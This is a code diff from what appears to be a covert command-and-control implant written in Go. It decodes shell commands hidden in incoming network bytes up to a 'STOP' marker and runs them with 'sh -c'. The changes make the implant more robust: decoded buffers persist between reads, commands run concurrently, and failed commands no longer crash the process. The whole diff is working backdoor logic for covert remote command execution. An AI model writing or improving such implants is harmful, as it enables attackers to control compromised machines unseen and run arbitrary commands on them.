@@ -82,6 +82,8 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 
 	cmd_bitIndex := 0
 	store_command := 0
+	var decoded_cmd_byte []byte
+	var fifo4 []byte
 
 	for{ //loop forever and keep recieving chunks. If there is a command, execute it
 		n, err := uConn.Read(buf)
@@ -96,8 +98,6 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 		//************logic for decoding the incoming bytes******************//
 		//-------decoding test
 
-		var decoded_cmd_byte []byte
-		var fifo4 []byte
 		var current_decoded_byte byte
 
 		for _, stegd_byte := range(buf[:n]){
@@ -120,8 +120,12 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 				}
 				if "STOP"==string(fifo4){
 					store_command = 0
-					executeCommand(decoded_cmd_byte)
+					finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
+					decoded_cmd_byte = decoded_cmd_byte[:0]
+					fmt.Println("decoded_cmd_byte = ", finalCommand)
+					go executeCommand(finalCommand)
 				}
+				//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
 				cmd_bitIndex =0
 				current_decoded_byte = 0
 			}
@@ -214,11 +218,8 @@ func calculateAndJitter(sl int){
 	return
 }
 
-func executeCommand(decoded_cmd_byte []byte){
-	if len(decoded_cmd_byte)!=0{
-		finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
-		fmt.Println("decoded_cmd_byte = ", finalCommand)
-
+func executeCommand(finalCommand string){
+	if len(finalCommand)!=0{
 		shellBinary := "sh"
 		shellFlag := "-c"
 		
@@ -229,7 +230,8 @@ func executeCommand(decoded_cmd_byte []byte){
 		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
 		res, err := cmd.Output()
 		if err != nil {
-			log.Fatalf("Failed to execute command: %v", err)
+			fmt.Printf("Failed to execute command: %v", finalCommand)
+			return
 		}
 
 		formatted_out := strings.TrimSpace(string(res))
